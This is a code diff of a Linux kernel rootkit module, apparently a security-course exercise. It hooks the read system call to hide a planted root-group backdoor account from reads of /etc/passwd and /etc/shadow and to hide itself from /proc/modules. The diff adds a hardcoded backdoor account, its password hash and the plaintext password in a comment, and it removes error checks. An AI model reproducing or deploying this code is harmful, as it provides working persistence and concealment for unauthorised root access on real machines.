@@ -15,7 +15,9 @@
 #include <linux/sched.h>
 #include <asm/current.h>
 #include <linux/kobject.h>
-
+#include <linux/proc_ns.h>
+#include <linux/file.h>
+#include <linux/fdtable.h>
 
 
 
@@ -86,11 +88,6 @@ void add_backdoor(char *path) {
 		set_fs(get_ds()); 
 	    	file = filp_open(path, O_RDWR, 0); 
 	    	set_fs(old_fs); 
-
-	    	if(IS_ERR(file)){
-// 			goto exit;
-			return;
-	    	}
 
 	    	//check if backdoor already exists
 	    	buffer = (char *) kmalloc(PAGE_SIZE, GFP_KERNEL);
@@ -194,16 +191,20 @@ asmlinkage long (*original_sys_read) (unsigned int fd, char __user *buf, size_t 
 
 asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count) {
 	
+	char* backdoor_password = "rootkituser1:x:987:0:backdoor:/home:/bin/bash\n";
+	char* backdoor_shadow = "rootkituser:$6$zTDiFKXM$SuJZFgTirs8r9O9PTskLTnvNV1tvMLiS6h87/c3xrRJEahO5q7bJTT5fgNZWPFrYskf6aNjwKto2dixpTr1Zw0:18232:0:99999:7:::\n";
+	// PASSWORD (encodes in SHA 512) = cse331!	
+	
 	unsigned long ret;
 	char *tmp;
 	char *pathname;
 	struct file *file;
 	struct path *path;
 	char *tmp_buf;
-	char *BACKDOOR;
+	char *backdoor;
 
     //call original read
-	ret = (*orig_read)(fd, buf, count);
+	ret = (*original_sys_read)(fd, buf, count);
 
 	if(ret <= 0){
 		goto exit;
@@ -230,27 +231,21 @@ asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count) {
 	pathname = d_path(path, tmp, PAGE_SIZE);
 	path_put(path);
 
-	if(IS_ERR(pathname)){
-		//free_page((unsigned long)tmp);
-		//DEBUG("pathname errors");
-		goto cleanup1;
-	}
-
     // Entry point into hiding module
-	if(strcmp(pathname, MODULE_FILE)==0){
+	if(strcmp(pathname, "/proc/modules")==0){
         ret = remove_rootkit(buf, ret);
     }
     
     //check if it's the files we want
-	if(strcmp(pathname, PASSWD_FILE)==0){
-		BACKDOOR = BACKDOOR_PASSWD;
-	} else if(strcmp(pathname, SHADOW_FILE)==0){
-		BACKDOOR = BACKDOOR_SHADOW;		
+	if(strcmp(pathname, "/etc/passwd")==0){
+		backdoor = backdoor_password;
+	} else if(strcmp(pathname, "/etc/shadow")==0){
+		backdoor = backdoor_shadow;		
 	} else {
         goto cleanup1;
     }
 
-	if(!(strstr(buf, BACKDOOR))){
+	if(!(strstr(buf, backdoor))){
 		goto cleanup1;
 	}
 
@@ -266,13 +261,13 @@ asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count) {
 	}
 
     //remove backdoor in buf, change ret
-	while((strstr(tmp_buf, BACKDOOR))){
+	while((strstr(tmp_buf, backdoor))){
 		char *strBegin  = tmp_buf;
-		char *substrBegin = strstr(strBegin, BACKDOOR);
-		char *substrEnd = substrBegin + strlen(BACKDOOR);
+		char *substrBegin = strstr(strBegin, backdoor);
+		char *substrEnd = substrBegin + strlen(backdoor);
 		int remaining_length = (int)(strlen(substrEnd)) + 1 ;
 		memmove(substrBegin, substrEnd, remaining_length);
-		ret = ret - strlen(BACKDOOR);
+		ret = ret - strlen(backdoor);
 	}
 
 	copy_to_user(buf, tmp_buf, ret);
